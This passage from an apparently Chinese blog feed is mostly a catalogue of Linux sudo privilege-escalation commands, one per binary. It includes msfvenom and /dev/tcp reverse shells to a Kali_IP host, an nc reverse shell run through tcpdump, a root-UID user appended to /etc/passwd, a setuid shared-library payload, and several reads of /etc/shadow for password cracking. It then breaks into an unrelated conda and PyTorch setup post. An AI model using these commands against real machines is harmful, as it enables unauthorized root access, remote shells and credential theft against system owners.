bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> msfvenom -p java/shell_reverse_tcp LHOST=Kali_IP LPORT=4444 -f jar -o shell.jar<span class="hljs-comment">#生成监听文件</span><br></code></pre></td></tr></table></figure><p><img src="/../img/Linux%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8sudo%E6%8F%90%E6%9D%83%E8%B6%85%E7%BA%A7%E6%97%A0%E6%95%8C%E5%A4%A7%E6%B1%87%E6%80%BB.md/10.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> php -S 0:80<span class="hljs-comment">#建立简单的web服务</span><br><span class="hljs-built_in">sudo</span> nc -lvnp 4444<span class="hljs-comment">#启动监听</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br>wget http://Kali_IP/shell.jar<span class="hljs-comment">#下载</span><br><span class="hljs-built_in">chmod</span> +x shell.jar<br><span class="hljs-built_in">sudo</span> java -jar shell.jar<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-jjs"><a href="#sudo-jjs" class="headerlink" title="sudo jjs"></a>sudo jjs</h2><p>javascript shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo nc -lvnp 9595<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;Java.type(&#x27;java.lang.Runtime&#x27;).getRuntime().exec([&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;exec 5&lt;&gt;/dev/tcp/Kali_IP/9595;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#x27;]).waitFor()&quot; | sudo jjs<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-journalctl"><a href="#sudo-journalctl" class="headerlink" title="sudo journalctl"></a>sudo journalctl</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo journalctl<br>  !/bin/bash<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-knife"><a href="#sudo-knife" class="headerlink" title="sudo knife"></a>sudo knife</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo knife exec -E &#x27;exec &quot;/bin/bash&quot;&#x27;<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-less"><a href="#sudo-less" class="headerlink" title="sudo less"></a>sudo less</h2><p><strong>很多的文本利用机制都是使用的 less 机制，提权机制也是相同的</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>mktemp ./XXXXX#生成一个临时文件<br>sudo less (生成的文件)<br>  !/bin/bash<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-man"><a href="#sudo-man" class="headerlink" title="sudo man"></a>sudo man</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo man ls<br>  !/bin/bash<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-more"><a href="#sudo-more" class="headerlink" title="sudo more"></a>sudo more</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br><span class="hljs-meta prompt_">#</span><span class="language-bash">找一个文件使得more一页放不下</span><br>sudo more File_Name<br>  !/bin/bash<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-mount"><a href="#sudo-mount" class="headerlink" title="sudo mount"></a>sudo mount</h2><p>mount 用于挂在系统的（磁盘、目录等）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo mount -o bind /bin/bash /usr/bin/mount<br>sudo mount  #执行bash命令<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-mysql"><a href="#sudo-mysql" class="headerlink" title="sudo mysql"></a>sudo mysql</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo mysql -e &#x27;\! /bin/bash&#x27;<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-nano"><a href="#sudo-nano" class="headerlink" title="sudo nano"></a>sudo nano</h2><p>文本编辑器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo nano<br>  Ctrl+R<br>  Ctrl+X<br>  reset;bash 1&gt;&amp;0 2&gt;&amp;0<br>  摁回车<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-neofetch"><a href="#sudo-neofetch" class="headerlink" title="sudo neofetch"></a>sudo neofetch</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l <br>a=$(mktemp)<br>echo &#x27;exec /bin/bash&#x27; &gt; $a<br>sudo neofetch --config $a<br></code></pre></td></tr></table></figure><h2 id="sudo-nice"><a href="#sudo-nice" class="headerlink" title="sudo nice"></a>sudo nice</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo nice /bin/bash #nice可以指定一个程序以10权限运行<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-nmap"><a href="#sudo-nmap" class="headerlink" title="sudo nmap"></a>sudo nmap</h2><p><strong><font style="background-color:#FBDE28;">nmap 的不同版本有不同的提权方式</font></strong></p><p>nmap 可以指定执行脚本文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>a=$(mktemp)<br>echo &#x27;os.execute(&quot;/bin/bash&quot;)&#x27; &gt; $a<br>sudo nmap --script=$a<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-node"><a href="#sudo-node" class="headerlink" title="sudo node"></a>sudo node</h2><p>node.js</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo node -e &quot;require(&#x27;child_process&#x27;).spawn(&#x27;/bin/bash&#x27;,&#123;stdio:[0,1,2]&#125;)&quot;<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-nohup"><a href="#sudo-nohup" class="headerlink" title="sudo nohup"></a>sudo nohup</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo nohup /bin/bash -c &quot;bash &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&quot;<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-openvpn"><a href="#sudo-openvpn" class="headerlink" title="sudo openvpn"></a>sudo openvpn</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br><span class="hljs-meta prompt_">#</span><span class="language-bash">指定参数读取</span><br>sudo openvpn --config /etc/shadow<br>会输出shadow的第一行：root的shadow的记录<br>john破解<br></code></pre></td></tr></table></figure><h2 id="sudo-passwd"><a href="#sudo-passwd" class="headerlink" title="sudo  passwd"></a>sudo  passwd</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo passwd root<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-perl"><a href="#sudo-perl" class="headerlink" title="sudo perl"></a>sudo perl</h2><p>perl 也是一种语言</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo perl -e &#x27;exec &quot;/bin/bash&quot;;&#x27;<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-php"><a href="#sudo-php" class="headerlink" title="sudo php"></a>sudo php</h2><p>php 命令行可以直接执行系统命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo php -r &quot;system(&#x27;/bin/bash&#x27;);&quot;<br></code></pre></td></tr></table></figure><p>php 还有很多其他的构造形式，使用过程中自行探索</p><h2 id="sudo-pico"><a href="#sudo-pico" class="headerlink" title="sudo pico"></a>sudo pico</h2><p>文本编辑器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo pico<br>  Ctrl+R<br>  Ctrl+X<br>  reset;bash 1&gt;&amp;0 2&gt;&amp;0<br>  摁回车<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-pkexec"><a href="#sudo-pkexec" class="headerlink" title="sudo pkexec"></a>sudo pkexec</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo pkexec /bin/bash<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-python3"><a href="#sudo-python3" class="headerlink" title="sudo python3"></a>sudo python3</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo python3 -c &quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;<br></code></pre></td></tr></table></figure><p>提权命令有很多，有很多方法</p><h2 id="sudo-rvim"><a href="#sudo-rvim" class="headerlink" title="sudo rvim"></a>sudo rvim</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo rvim -c &#x27;:python import os; os.execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-c&quot;,&quot;reset;exec bash&quot;)&#x27;<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-scp"><a href="#sudo-scp" class="headerlink" title="sudo scp"></a>sudo scp</h2><p>secure copu：利用 ssh 进行远程的安全的文件复制的工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>a=$(mktemp)<br>echo &#x27;bash 0&lt;&amp;2 1&lt;&amp;2&#x27; &gt; $a<br>chmod +x &quot;$a&quot;<br>sudo scp -S $a x y:<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-screen"><a href="#sudo-screen" class="headerlink" title="sudo screen"></a>sudo screen</h2><p>终端复用工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo screen<br>摁回车<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-script"><a href="#sudo-script" class="headerlink" title="sudo script"></a>sudo script</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo script#此命令即可进入root权限，但是会有记录<br>sudo script -q /dev/null#可以进入root但是不会记录<br></code></pre></td></tr></table></figure><h2 id="sudo-sed"><a href="#sudo-sed" class="headerlink" title="sudo sed"></a>sudo sed</h2><p>强大的文本处理工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo sed -n &#x27;1e exec bash 1&gt;&amp;0&#x27; /etc/hosts<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-service"><a href="#sudo-service" class="headerlink" title="sudo service"></a>sudo service</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo service ../../bin/bash#service在搜索可执行文件的时候是在path中进行搜索，因此需要../回退目录<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-socat"><a href="#sudo-socat" class="headerlink" title="sudo socat"></a>sudo socat</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo socat stdin exec:/bin/bash<br><br></code></pre></td></tr></table></figure><h2 id="sudo-ssh"><a href="#sudo-ssh" class="headerlink" title="sudo ssh"></a>sudo ssh</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>sudo ssh -o ProxyCommand=&#x27;;bash 0&lt;&amp;2 1&gt;&amp;2&#x27; x<br></code></pre></td></tr></table></figure><h2 id="sudo-ssh-keygen"><a href="#sudo-ssh-keygen" class="headerlink" title="sudo ssh-keygen"></a>sudo ssh-keygen</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br>vim a.c#编辑一个c文件<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">()</span>__<span class="hljs-title function_">attribute__</span><span class="hljs-params">((constructor))</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">()</span>&#123;<br>    setuid(<span class="hljs-number">0</span>);<br>    system(<span class="hljs-string">&quot;/bin/bash -P&quot;</span>);<br>&#125;<br><br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -shared -fPIC -o a.so a.c<span class="hljs-comment">#生成a.so文件，需查看是否有执行权限</span><br><span class="hljs-built_in">sudo</span> ssh-keygen -D ./a.so<span class="hljs-comment">#提权命令，如果没成功的话自己去调研一下</span><br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-strace"><a href="#sudo-strace" class="headerlink" title="sudo strace"></a>sudo strace</h2><p>追踪和记录另一个进程的系统调用和接受到的信号，对于调试和理解程序的运行方式有用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> strace -o /dev/null /bin/bash<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-systemctl"><a href="#sudo-systemctl" class="headerlink" title="sudo systemctl"></a>sudo systemctl</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> systemctl<br>  !/bin/bash<br>成功<br></code></pre></td></tr></table></figure><p>sudo tcpdump</p><p>监听&#x2F;捕获网络流量的工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-comment">#将网络流量包捕获并传递给一个脚本进行处理</span><br>vim a.sh<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mknod</span> a_pipe p &amp;&amp; /bin/nc Kali_IP 9595 0&lt;a_pipe | /bin/bash 1&gt;a_pipe<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -liah a.sh<span class="hljs-comment">#查看是否有编辑权限</span><br>ip a<span class="hljs-comment">#查看靶机的网卡</span><br><span class="hljs-built_in">sudo</span> tcpdump -<span class="hljs-built_in">ln</span> -i eth0 -w /dev/null -W 1 -G 1 -z /a.sh -Z root<span class="hljs-comment">#提权命令</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nc -lvnp 9595<span class="hljs-comment">#靶机运行提权命令后即可反连进入shell</span><br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-tee"><a href="#sudo-tee" class="headerlink" title="sudo tee"></a>sudo tee</h2><p>此次利用使用的是 passwd 文件，实际场景中研究一下是否也可以使用 shadow 文件呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl passwd -1 -salt UserTest <span class="hljs-string">&#x27;123456&#x27;</span><span class="hljs-comment">#生成有盐值的hash值</span><br><span class="hljs-built_in">cat</span> /etc/passwd | grep root<span class="hljs-comment">#获取linux中的passwd的组成形式</span><br>修改passwd<br></code></pre></td></tr></table></figure><p><img src="/../img/Linux%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8sudo%E6%8F%90%E6%9D%83%E8%B6%85%E7%BA%A7%E6%97%A0%E6%95%8C%E5%A4%A7%E6%B1%87%E6%80%BB.md/11.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;UserTest:$1$UserTest$zRq5YT8zuNyGcNb/88Uov.:0:0:root:/root:/usr/bin/bash&#x27;</span> | <span class="hljs-built_in">sudo</span>  <span class="hljs-built_in">tee</span> -a /etc/passwd<br>su UserTest<br>  123456<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-timedatectl"><a href="#sudo-timedatectl" class="headerlink" title="sudo timedatectl"></a>sudo timedatectl</h2><p>类似 less 利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> timedatectl list-timezones<br>  !/bin/bash<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-tmux"><a href="#sudo-tmux" class="headerlink" title="sudo tmux"></a>sudo tmux</h2><p>端口复用工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> tmux<br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-vi"><a href="#sudo-vi" class="headerlink" title="sudo vi"></a>sudo vi</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> vi <br>  :!/bin/bash<br>成功<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vi -c <span class="hljs-string">&#x27;:!/bin/bash&#x27;</span> /dev/null<span class="hljs-comment">#与上边方法同理</span><br></code></pre></td></tr></table></figure><h2 id="sudo-wall"><a href="#sudo-wall" class="headerlink" title="sudo wall"></a>sudo wall</h2><p>广播消息的命令。</p><p>有 sudo 权限就可以读取任何文本文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> wall --no /etc/shadow<br>john破解shadow<br></code></pre></td></tr></table></figure><h2 id="sudo-watch"><a href="#sudo-watch" class="headerlink" title="sudo watch"></a>sudo watch</h2><p>周期性（每 2s）执行命令并显示结果的程序，-x 参数可以在命令行输出执行的参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> watch -x bash -c <span class="hljs-string">&#x27;reset; exec bash 1&gt;&amp;0 2&gt;&amp;0&#x27;</span><br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-wget"><a href="#sudo-wget" class="headerlink" title="sudo wget"></a>sudo wget</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br>a=$(<span class="hljs-built_in">mktemp</span>)<br><span class="hljs-built_in">chmod</span> +x <span class="hljs-variable">$a</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;#!/bin/bash\n/bin/bash 1&gt;&amp;0&#x27;</span> &gt; <span class="hljs-variable">$a</span><br><span class="hljs-built_in">sudo</span> wget --use-askpass=<span class="hljs-variable">$a</span> 0<span class="hljs-comment">#构造use-askpass参数</span><br>成功<br></code></pre></td></tr></table></figure><p>-o 参数可以将下载的内容重写到某一个位置（也可以利用）</p><h2 id="sudo-zip"><a href="#sudo-zip" class="headerlink" title="sudo zip"></a>sudo zip</h2><p>-T#检测压缩文件的完整性</p><p>-TT #指定一个程序去检测压缩包的完整性，可以指定加入提权逻辑的程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> zip foo /etc/hostname -T -TT <span class="hljs-string">&#x27;bash #&#x27;</span><br>成功<br></code></pre></td></tr></table></figure><h2 id="sudo-xxd"><a href="#sudo-xxd" class="headerlink" title="sudo xxd"></a>sudo xxd</h2><p>可以将一个二进制文件转换成 十六进制，也可逆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> xxd /etc/shadow | xxd -r <span class="hljs-comment">#明文shadow文件</span><br>john破解<br></code></pre></td></tr></table></figure><p>OVER！</p>]]></content>
    
    
    <categories>
      
      <category>Linux提权</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sudo提权汇总</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CONDA命令使用+Pycharm配置anaconda环境+CUDA版本确认+安装pytorch+安装Jupyter+如何快速运行一个现存的py项目</title>
    <link href="/2025/07/02/CONDA%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8+Pycharm%E9%85%8D%E7%BD%AEanaconda%E7%8E%AF%E5%A2%83+CUDA%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4+%E5%AE%89%E8%A3%85pytorch+%E5%AE%89%E8%A3%85Jupyter+%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%8E%B0%E5%AD%98%E7%9A%84py%E9%A1%B9%E7%9B%AE/"/>
    <url>/2025/07/02/CONDA%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8+Pycharm%E9%85%8D%E7%BD%AEanaconda%E7%8E%AF%E5%A2%83+CUDA%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4+%E5%AE%89%E8%A3%85pytorch+%E5%AE%89%E8%A3%85Jupyter+%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%8E%B0%E5%AD%98%E7%9A%84py%E9%A1%B9%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<p>PyTorch 和 Tensorflow 就是 python 的库（做深度学习只能用 N卡）</p><p>都是通过 pip 安装</p><p><img src="/../img/CONDA%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8+Pycharm%E9%85%8D%E7%BD%AEanaconda%E7%8E%AF%E5%A2%83+CUDA%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4+%E5%AE%89%E8%A3%85pytorch+%E5%AE%89%E8%A3%85Jupyter+%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%8E%B0%E5%AD%98%E7%9A%84py%E9%A1%B9%E7%9B%AE.md/1.png"></p><h2 id="Anaconda"><a href="#Anaconda" class="headerlink" title="Anaconda"></a>Anaconda</h2><p>有虚拟环境；支持不同语言的不同版本的管理</p><p><img src="/../img/CONDA%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8+Pycharm%E9%85%8D%E7%BD%AEanaconda%E7%8E%AF%E5%A2%83+CUDA%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4+%E5%AE%89%E8%A3%85pytorch+%E5%AE%89%E8%A3%85Jupyter+%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%8E%B0%E5%AD%98%E7%9A%84py%E9%A1%B9%E7%9B%AE.md/2.png"></p><h2 id="conda-命令"><a href="#conda-命令" class="headerlink" title="conda 命令"></a>conda 命令</h2><h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><p>创建一个名为 “myenv” 的新环境，制定 python 版本为 3.8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda create --name myenv python=3.8<br></code></pre></td></tr></table></figure><p>激活环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">conda activate myenv<br></code></pre></td></tr></table></figure><p>退出当前环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 